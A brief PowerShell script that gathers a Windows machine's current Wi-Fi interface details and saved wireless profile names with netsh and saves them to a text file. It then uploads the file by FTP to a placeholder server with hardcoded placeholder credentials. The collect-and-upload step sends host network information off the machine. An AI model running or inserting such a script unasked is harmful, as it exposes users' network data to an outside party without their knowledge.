
$hostname = $env:COMPUTERNAME
$Folder = 'C:\Temp'
If (-not (Test-Path $Folder)) {
    # Folder does not exist, create it
    New-Item -Path $Folder -ItemType Directory
}

$current = (C:\Windows\system32\netsh.exe wlan show interfaces)
$profiles = (C:\Windows\system32\netsh.exe wlan show profile)

$out = $current + $profiles
$out | Out-File -FilePath "C:\temp\$hostname.txt"

$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("username", "password")
$client.UploadFile("ftp://FTP_IP_ADDRESS/$hostname.txt", "C:\Temp\$hostname.txt")



